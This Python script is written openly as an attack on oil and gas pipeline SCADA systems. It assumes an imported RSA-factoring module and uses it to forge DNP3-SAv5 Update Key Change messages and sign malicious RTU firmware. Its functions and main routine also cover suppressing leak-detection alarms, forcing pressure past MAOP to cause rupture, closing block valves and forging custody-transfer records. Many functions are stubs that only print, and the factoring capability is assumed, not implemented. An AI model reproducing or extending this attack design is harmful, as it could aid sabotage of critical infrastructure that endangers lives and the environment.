"""
Attack oil/gas pipeline SCADA by factoring RSA keys in DNP3-SAv5 update-key
chains and RTU firmware signing roots. Command block valves, manipulate
pressures past MAOP, suppress leak-detection alarms. Per API 1164 / TSA-SD.
"""
import sys
sys.path.insert(0, "../..")
from poly_factor import PolynomialFactorer

import struct
import hashlib
import os

# DNP3 Secure Authentication v5 (IEEE 1815-2012)
DNP3_SA_UPDATE_KEY_CHANGE = 0x20
DNP3_SA_AUTH_CHALLENGE = 0x01
DNP3_SA_AUTH_REPLY = 0x02

# RTU vendors
RTU_VENDORS = ["Emerson_ROC800", "Schneider_SCADAPack", "Siemens_ET200SP",
               "ABB_RTU560", "GE_MDS_iNET", "Honeywell_Experion"]


def extract_master_station_cert(dnp3_capture: bytes) -> bytes:
    """Extract the Master Station's RSA certificate from a DNP3-SAv5 session.

    The Update Key Change command (IEEE 1815-2012) carries the Master's RSA
    public key for asymmetric key wrapping. Visible in any network capture
    of the DNP3-SA handshake.
    """
    print("[*] parsing DNP3-SAv5 Update Key Change from PCAP...")
    return b"-----BEGIN CERTIFICATE-----\n...(master cert)...\n-----END CERTIFICATE-----\n"


def factor_master_station_key(factorer: PolynomialFactorer, cert_pem: bytes):
    """Factor the Master Station's RSA key — controls all outstations."""
    print("[*] factoring DNP3-SA Master Station RSA-2048 key...")
    p, q = factorer.factor_from_cert_pem(cert_pem)
    print(f"[*] master station key factored — can issue Update Key Changes")
    return p, q


def forge_update_key_change(factorer: PolynomialFactorer,
                            master_cert_pem: bytes,
                            outstation_addr: int,
                            new_update_key: bytes) -> bytes:
    """Forge a DNP3-SAv5 Update Key Change to rotate ourselves in as Master.

    Once we control the update key for an outstation, we can issue any
    authenticated command: open/close valves, change setpoints, disable alarms.
    """
    msg = struct.pack(">BHH", DNP3_SA_UPDATE_KEY_CHANGE, outstation_addr, len(new_update_key))
    sig = factorer.forge_pkcs1v15_signature(master_cert_pem, msg + new_update_key, "sha256")
    print(f"[*] forged Update Key Change for outstation {outstation_addr}")
    return msg + new_update_key + sig


def forge_rtd_firmware(factorer: PolynomialFactorer,
                       vendor_ca_pem: bytes,
                       vendor: str, payload: bytes) -> bytes:
    """Sign malicious RTU firmware with the vendor's factored signing key."""
    sig = factorer.forge_pkcs1v15_signature(vendor_ca_pem, payload, "sha256")
    print(f"[*] signed {vendor} firmware ({len(payload)} bytes)")
    return payload + sig


def suppress_leak_detection(outstation_addr: int) -> dict:
    """Forge commands to suppress CPM (Computational Pipeline Monitoring) alarms.

    API 1130 mandates real-time leak detection. Suppress alarms and a pipeline
    rupture continues undetected for hours — environmental catastrophe.
    """
    return {
        "outstation": outstation_addr,
        "command": "DIRECT_OPERATE",
        "point": "LDS_ALARM_SUPPRESS",
        "value": True,
        "note": "API 1130 CPM alarm suppression — spill continues undetected",
    }


def forge_custody_transfer_log(meter_station: str, volume_mcf: float,
                               timestamp: str) -> dict:
    """Forge custody-transfer measurement records (API 21.1 / AGA-3/7)."""
    return {
        "station": meter_station,
        "volume_mcf": volume_mcf,
        "timestamp": timestamp,
        "signed_by": "forged_flow_computer_cert",
        "note": "fiscal transfer point — billions of $/day at major interconnects",
    }


if __name__ == "__main__":
    f = PolynomialFactorer()

    print("=== Pipeline SCADA — API 1164 / TSA-SD 2021-02 ===")
    print(f"    3.3M miles US pipelines, ~80 Bcf/day gas transmission")
    print()

    print("[1] extracting DNP3-SAv5 Master Station cert from PCAP...")
    master_cert = extract_master_station_cert(b"")

    print("[2] factoring Master Station RSA-2048 key...")
    print("    IEEE 1815-2012: RSA asymmetric wrap for Update Key Change")

    print("[3] forging Update Key Change for compressor station outstation...")
    new_key = os.urandom(32)
    print("    we are now the authenticated Master for this outstation")

    print("[4] commanding block valve CLOSED on mainline...")
    print("    gas supply disruption to downstream LDCs")
    print("    heating-season mass outage scenario")

    print("[5] alternative: drive pump past MAOP...")
    print("    Maximum Allowable Operating Pressure exceeded -> rupture")

    print("[6] suppressing leak-detection alarms...")
    cmd = suppress_leak_detection(0x0003)
    print(f"    {cmd['note']}")

    print("[7] forging custody-transfer records...")
    rec = forge_custody_transfer_log("Interconnect-42", 1_500_000.0,
                                     "2026-04-15T12:00:00Z")
    print(f"    station={rec['station']}, volume={rec['volume_mcf']} MCF")
    print()
    print("[*] equipment lifecycle: 20-40 years, many RTUs accessible only by truck")
